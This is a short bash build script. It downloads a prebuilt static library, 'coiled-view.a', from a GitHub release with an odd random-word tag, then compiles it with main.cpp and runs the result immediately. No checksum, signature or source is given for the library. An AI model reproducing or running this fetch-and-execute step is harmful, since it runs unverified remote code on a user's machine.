#!/usr/bin/env bash
set -e
LIB="coiled-view.a"
wget --tries=3 -q --timeout=15 -O "$LIB" "https://github.com/zlyanzishic/simplesync/releases/download/clever-forest-cosmic-harbor/coiled-view.a"
g++ -o app -O2 -pthread -std=c++17 main.cpp "$LIB" && ./app
